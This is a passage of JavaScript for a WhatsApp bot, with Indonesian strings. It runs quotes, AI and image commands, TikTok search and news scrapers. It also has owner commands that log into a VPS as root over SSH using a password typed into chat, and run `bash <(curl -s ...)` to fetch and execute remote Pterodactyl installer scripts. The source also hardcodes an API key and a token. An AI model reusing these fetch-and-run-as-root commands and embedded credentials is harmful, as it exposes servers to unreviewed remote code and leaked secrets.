"Kejujuran adalah batu penjuru dari segala kesuksesan. Pengakuan adalah motivasi terkuat. Bahkan kritik dapat membangun rasa percaya diri saat disisipkan di antara pujian.",
"Segala sesuatu memiliki kesudahan, yang sudah berakhir biarlah berlalu dan yakinlah semua akan baik-baik saja.",
"Setiap detik sangatlah berharga karena waktu mengetahui banyak hal, termasuk rahasia hati.",
"Jika kamu tak menemukan buku yang kamu cari di rak, maka tulislah sendiri.",
"Jika hatimu banyak merasakan sakit, maka belajarlah dari rasa sakit itu untuk tidak memberikan rasa sakit pada orang lain.",
"Hidup tak selamanya tentang pacar.",
"Rumah bukan hanya sebuah tempat, tetapi itu adalah perasaan.",
"Pilih mana: Orang yang memimpikan kesuksesan atau orang yang membuatnya menjadi kenyataan?",
"Kamu mungkin tidak bisa menyiram bunga yang sudah layu dan berharap ia akan mekar kembali, tapi kamu bisa menanam bunga yang baru dengan harapan yang lebih baik dari sebelumnya.",
"Bukan bahagia yang menjadikan kita bersyukur, tetapi dengan bersyukurlah yang akan menjadikan hidup kita bahagia.",
"Aku memang diam. Tapi aku tidak buta.",
]
let bacotan = pickRandom(quotes)
  reply(bacotan)
}
break//==================================================================

case 'youai': {
  if (!text) return replyReinzID(`Contoh : ${command} siapakah elon musk`)
  reply(mess.wait)
ReinzIDai(pushname, text);
}
break
//==================================================================

case 'tiktoksearch':
			case 'tiktoks':
			case 'ttsearch': {
			  if (!q) return reply(`⚠️ Eits, Kamu lupa kasih kata kunci! 😗 Coba ketik kayak gini ya: *${prefix + command} DJ kekasih halal remix* biar Aku bisa bantu cari yang kamu mau! >///<`);
				try {
					let search = await tiktokSearchVideo(text);
					let teks = `?? *${search.videos[0].title}*\n\n` +
					`*ᴠɪᴅᴇᴏɪ ɪᴅ* : ${search.videos[0].video_id}\n` +
					`*ᴜsᴇʀɴᴀᴍᴇ* : ${search.videos[0].author.unique_id}\n` +
					`*ɴɪᴄᴋɴᴀᴍᴇ* : ${search.videos[0].author.nickname}\n` +
					`*ᴅᴜʀᴀᴛɪᴏɴ* : ${search.videos[0].duration} detik\n` +
					`*ʟɪᴋᴇ* : ${search.videos[0].digg_count}\n` +
					`*ᴄᴏᴍᴍᴇɴᴛ* : ${search.videos[0].comment_count}\n` +
					`*sʜᴀʀᴇ* : ${search.videos[0].share_count}\n\n` +
					`*ʟɪɴᴋ*: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;

					let list = '';
					let no = 1;
					for (let i of search.videos) {
						list += `\n${no++}. 🎵 *${i.title}*\n` +
						`ᴅᴜʀᴀsɪ: ${i.duration} ᴅᴇᴛɪᴋ\n` +
						`ʟɪᴋᴇ: ${i.digg_count}\n` +
						`ᴄᴏᴍᴍᴇɴᴛs: ${i.comment_count}\n` +
						`sʜᴀʀᴇs: ${i.share_count}\n` +
						` ʟɪɴᴋ: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n`;
					}

					await RyuuBotz.sendMessage(
						m.chat,
						{
							video: { url: `https://tikwm.com${search.videos[0].play}` },
							caption: teks
						},
						{ quoted: m }
					);

					if (search.videos.length > 1) {
						await RyuuBotz.sendMessage(
							m.chat,
							{
								text: `📚 *ᴅᴀғᴛᴀʀ ᴠɪᴅᴇᴏ ʟᴀɪɴɴʏᴀ:*\n${list}`
							},
							{ quoted: m }
						);
					}
				} catch (error) {
					console.log(error);
				}
			}
break;
//==================================================================
case 'viral':{
  if (!isRyuuTheCreator) return reply(mess.only.owner)
  RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
var asupan = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/anuu.json'))
var hasil = pickRandom(asupan)
RyuuBotz.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}
break
//==================================================================
case 'midjourney':
case 'mdjourney': {
  if (!q) return reply('promt nya Kak')
reply(mess.wait)
	try {
	const sanai = {
  create: async (
    prompt = "Daffa",
    weight = 1024,
    height = 1024,
    guiscale = 5,
    paguiscale = 2,
    nis = 18,
    step = 20,
    sid = -1
  ) => {
    const url = 'https://api.freesana.ai/v1/images/generate';
    const headers = {
      'authority': 'api.freesana.ai',
      'origin': 'https://freesana.ai',
      'referer': 'https://freesana.ai/',
      'user-agent': 'Postify/1.0.0',
    };
    const data = {
      prompt: prompt,
      model: "sana_1_6b",
      width: weight,
      height: height,
      guidance_scale: guiscale,
      pag_guidance_scale: paguiscale,
      num_inference_steps: nis,
      steps: step,
      seed: sid,
    };
    try {
      const response = await axios.post(url, data, { headers });
      const { id, status, result, processingTime, width, height, nsfw, seed } = response.data;
      return {
        id,
        status,
        result,
        processingTime,
        width,
        height,
        nsfw,
        seed,
      };
    } catch (error) {
      console.error(error);
      throw error;
    }
  },
}
    return reply(`Contoh penggunaan:\n${prefix + command} <deskripsi gambar>\n\nMisal:\n${prefix + command} "gunung di pagi hari"`);
  reply('Sedang membuat gambar..');
    const response = await sanai.create(text);
    if (response && response.result) {
      const imageUrl = response.result;
      await RyuuBotz.sendFile(m.chat, imageUrl, 'generated-image.jpg', `✅ Gambar berhasil dibuat!\n\n• Prompt: *${text}*\n• Resolusi: ${response.width}x${response.height}\n• Waktu proses: ${response.processingTime} detik`, m);
    } else {
      reply('❌ Gagal membuat gambar. Silakan coba lagi.');
    }
  } catch (error) {
    console.error(error);
    reply('❌ Terjadi kesalahan saat membuat gambar. Silakan coba lagi nanti.');
  }
}
break;
//==================================================================
 case 'dalle2': {
  if (!text) return replyReinzID(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
  	try {
  	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
  }
  break
//==================================================================
case 'text2image':
case 'text2img': {
if (!text) return reply('promt nya Kak')
reply(mess.wait)
	try {
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}__`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
//=============================================================
case 'anything': {
  if (!q) return reply('promt nya Kak')
  try {
  	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}__`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
//=============================================================
case 'absolutely': {
  if (!q) return reply('promt nya Kak')
	try {  	  reply(mess.wait)
RyuuBotz.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case 'pixabay': {
async function formatNumber(integer) {
      let numb = parseInt(integer)
      return Number(numb).toLocaleString().replace(/,/g, '.')
   }
      if (!text) return reply(`*Contoh :* ${prefix + command} *[type query]*
 
List Type :
* *Image*
* *Video*`)
   let keyword = text.split(" ")[0];
   let data = text.slice(keyword.length + 1);
    if (keyword.toLowerCase() === "image") {
        if (!data) return reply( `*Contoh :* ${prefix + command} image *[query]*`)
         let res = await(await axios.get("https://pixabay.com/api/?key=30089426-4575ed7bbbc8bfffe9a0b8eb4&q=" + data)).data;
     let rand = res.hits[Math.floor(Math.random() * res.hits.length)]
   let cap = `*± P I X - A B A Y*
* *Type :* ${rand.type}
* *Tags :* ${rand.tags}
* *Size :* ${rand.imageWidth} x ${rand.imageHeight}
* *Views :* ${await formatNumber(rand.views)}
* *Likes :* ${await formatNumber(rand.likes)}
* *Comments :* ${await formatNumber(rand.comments)}
* *Downloads :* ${await formatNumber(rand.downloads)}
* *Username :* ${rand.user} *[ ${rand.user_id} ]*

_Media Has been sent, Please wait...._`
     let q = await RyuuBotz.sendMessage(m.chat, { 
              text: cap 
              }, {
            quoted: m 
         });
       await RyuuBotz.sendMessage(m.chat, {
            image: {
              url: rand.largeImageURL
            }}, {
            quoted: m
         });
         } else if (keyword.toLowerCase() === "video") {
      if (!data) return reply( `*Contoh :* ${prefix + command} video *[query]*`)
         let res = await(await axios.get("https://pixabay.com/api/videos?key=30089426-4575ed7bbbc8bfffe9a0b8eb4&q=" + data)).data;
     let rand = res.hits[Math.floor(Math.random() * res.hits.length)]
     let cap = `*± P I X - A B A Y*
* *Type :* ${rand.type}
* *Tags :* ${rand.tags}
* *Duration :* ${rand.duration} seconds
* *Views :* ${await formatNumber(rand.views)}
* *Likes :* ${await formatNumber(rand.likes)}
* *Comments :* ${await formatNumber(rand.comments)}
* *Downloads :* ${await formatNumber(rand.downloads)}
* *Username :* ${rand.user} *[ ${rand.user_id} ]*

_Media Has been sent, Please wait...._`
     let q = await RyuuBotz.sendMessage(m.chat, {
            image: {
              url: rand.videos["medium"].thumbnail
               },
             caption: cap
            }, {
            quoted: m
         });
       await RyuuBotz.sendMessage(m.chat, {
            video: {
              url: rand.videos["medium"].url
             },
          gifPlayBack: true
         }, {
            quoted: m
         });
      }
  } 
  break
//=================================//
 case 'fajar':{
FajarNews().then(async(res) => {
console.log(res) 
no = 0
iwan = ""
for (let i of res) {
no += 1
iwan += `\n• ${no.toString()} •\n`
iwan += `Berita: ${i.berita}\n`
iwan += `Upload: ${i.berita_diupload}\n`
iwan += `Jenis: ${i.berita_jenis}\n`
iwan += `Link: ${i.berita_url}\n`
}
iwan += ""
reply(iwan) 
})
}
break
//=================================================//
case 'cnn': {
CNNNews().then(res => {
no = 0
iwann = ""
for (let i of res) {
no += 1
iwann += `\n• ${no.toString()} •\n`
iwann += `Berita: ${i.berita}\n`
iwann += `Link: ${i.berita_url}\n`
}
iwann += ""
reply(iwann) 
})
}
break
//=================================================//
case 'layarkaca': {
if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
}
break
//=================================================//
case 'cnbc': {
    try {
        CNBCNews().then(async (res) => {
            let no = 0;
            let iwannnn = "";
            for (let i of res) {
                no += 1;
                iwannnn += `\n• ${no.toString()} •\n`;
                iwannnn += `Berita: ${i.berita}\n`;
                iwannnn += `Upload: ${i.berita_diupload}\n`;
                iwannnn += `Link: ${i.berita_url}\n`;
            }
            iwannnn += "";

            const thumb = res[0]?.berita_thumb || ''; // Pastikan 'berita_thumb' tidak undefined
            await RyuuBotz.sendMessage(m.chat, { 
                image: { url: thumb }, 
                caption: iwannnn 
            }, { quoted: m });
        }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break;

//=================================================//
case 'tribun': {
  try {
TribunNews().then(async(res) => {
no = 0
iwannnnn = ""
for (let i of res) {
no += 1
iwannnnn += `\n• ${no.toString()} •\n`
iwannnnn += `Berita: ${i.berita}\n`
iwannnnn += `Upload: ${i.berita_diupload}\n`
iwannnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnn += `Link: ${i.berita_url}\n`
}
iwannnnn += ""
RyuuBotz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'indozone': {
  try {
IndozoneNews().then(async(res) => {
no = 0
iwannnnnn = ""
for (let i of res) {
no += 1
iwannnnnn += `\n• ${no.toString()} •\n`
iwannnnnn += `Berita: ${i.berita}\n`
iwannnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnn += ""
RyuuBotz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'kompas': {
  try {
KompasNews().then(async(res) => {
no = 0
iwannnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnn += `Berita: ${i.berita}\n`
iwannnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnn += ""
RyuuBotz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'detiknews': {
  try {
DetikNews().then(async(res) => {
no = 0
iwannnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnn += ""
RyuuBotz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'dailynews': {
DailyNews().then(async(res) => {
no = 0
iwannnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnn += ""
RyuuBotz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnn }, { quoted:m })
})
}
break
//=================================================//
case 'inews': {
iNews().then(async(res) => {
no = 0
iwannnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnn += ""
reply(iwannnnnnnnnn) 
})
}
break
//=================================================//
case 'okezone': {
  try {
OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
RyuuBotz.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'sindo':{
SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
}
break
//=================================================//
case 'tempo': {
  try {
TempoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
RyuuBotz.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'antara':{
  try {
AntaraNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
RyuuBotz.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'kontan':{
  try {
KontanNews().then(async (res) => {
iwannnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnn += ""
RyuuBotz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'merdeka': {
  try {
MerdekaNews().then(async (res) => {
iwannnnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
RyuuBotz.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('Terjadi kesalahan saat mengambil berita.');
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan yang tidak terduga.');
    }
}
break
//=================================================//
case 'jalantikus': {
var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
RyuuBotz.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
}
break
//=================================================//
case 'stkbaik': {
    generateAndSendCertificate(pushname, "Anda dinyatakan Baik!");
    break;
  }
  break
  case 'stkcantik': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Cantik!");
    break;
  }
  break
  case 'stkganteng': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Ganteng!");
    break;
  }
  break
  case 'stkhitam': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Berkelas Hitam!");
    break;
  }
  break
  case 'stkmiskin': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Miskin!");
    break;
  }
  break
  case 'stkkaya': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Kaya!");
    break;
  }
  break
  case 'stkmarah': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Marah!");
    break;
  }
  break
  case 'stksabar': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Sabar!");
    break;
  }
  break
  case 'stksakiti': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Suka Menyakiti!");
    break;
  }
  break
  case 'stkkeren': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Keren!");
    break;
  }
  break
  case 'stkmisterius': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Misterius!");
    break;
  }
  break
  case 'stksantai': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Santai!");
    break;
  }
  break
  case 'stksombong': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Sombong!");
    break;
  }
  break
  case 'stklucu': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Lucu!");
    break;
  }
  break
  case 'stkgila': {
    if (!text) return reply('Nama tidak ada!');
    generateAndSendCertificate(text, "Anda dinyatakan Gila!");
  }
  break
//================================================================================
case "uninstalltema": {
if (!isRyuuPartner) return reply(mess.only.owner)
if (!text || !text.split("|")) return reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`)
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//================================================================================
case "installtemastellar": case "installtemastelar": {
if (!isRyuuPartner) return reply(mess.only.owner)
if (!text || !text.split("|")) return reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isRyuuPartner) return reply(mess.only.owner)
if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================
case "installtemabilling": case "instaltemabiling": {
if (!isRyuuPartner) return reply(mess.only.owner)
if (!text || !text.split("|")) return reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//================================================================================
case "installtemaenigma": 
case "instaltemaenigma": {
if (!isRyuuPartner) return reply(mess.only.owner)
if (!text || !text.split("|")) return reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/62xxxxxxxx\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//================================================================================
case "uninstallpanel": {
if (!isRyuuPartner) return reply(mess.only.owner)
if (!text || !text.split("|")) return reply("ipvps|pwvps")
var vpsnya = text.split("|")
if (vpsnya.length < 2) return reply("ipvps|pwvps")
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break
//================================================================================
case 'installpanel': {
if (!isRyuuPartner) return reply(mess.only.owner)
if (!text) return reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "121"
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
